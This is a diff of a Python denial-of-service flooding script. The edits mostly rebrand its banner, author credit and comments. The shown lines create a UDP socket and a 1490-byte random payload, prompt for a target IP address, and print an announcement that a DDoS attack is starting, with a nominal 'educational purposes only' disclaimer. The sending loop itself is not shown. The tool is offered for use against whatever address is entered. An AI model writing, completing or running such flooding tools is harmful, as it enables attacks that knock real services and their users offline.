@@ -6,34 +6,34 @@ import random
 from colorama import Fore, Style, init
 from datetime import datetime
 
-# Initialize colorama
+# Initialize colorama for colored output
 init(autoreset=True)
 
 # Socket Setup
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 payload = random._urandom(1490)
 
-# Clear terminal
+# Clear terminal screen
 os.system("cls" if os.name == "nt" else "clear")
 
 # Print Banner
-os.system("figlet GMKR-DDoS")
+os.system("figlet DDoS")
 print(f"{Fore.CYAN}Created By : Shaid Mahamud")
 print(f"{Fore.CYAN}Author     : shaid69")
-print(f"{Fore.CYAN}GitHub     : github.com/shid69")
+print(f"{Fore.CYAN}GitHub     : github.com/shaid69")
 print(f"{Fore.YELLOW}Note: This tool is for educational purposes only. Use at your own risk.")
 print()
 
-# Get Target IP
+# Get Target IP from user
 ip = input(f"{Fore.GREEN}Enter Target IP Address: ")
 
 # Clear screen and show attack preparation
 os.system("cls" if os.name == "nt" else "clear")
-os.system("figlet GMKR-DDoS")
-print(f"{Fore.MAGENTA}Team : GAMKERS")
+os.system("figlet DDoS")
+print(f"{Fore.MAGENTA}Team : shaid69")
 print(Fore.LIGHTGREEN_EX + "_" * 60)
 
-# Loading animation for connection setup
+# Loading animation before starting the attack
 loading_messages = [
     f"{Fore.YELLOW}[*] Trying to reach the server...",
     f"{Fore.YELLOW}[*] Establishing connection...",
@@ -49,7 +49,7 @@ for message in loading_messages:
 print(f"{Fore.RED}Starting DDoS Attack... (Educational Purposes Only)")
 time.sleep(2)
 
-# Display progress bar for visual feedback
+# Function to display progress bar
 def progress_bar(sent, total):
     progress = int((sent / total) * 100)
     bar = f"[{'#' * (progress // 2)}{' ' * (50 - progress // 2)}] {progress}%"
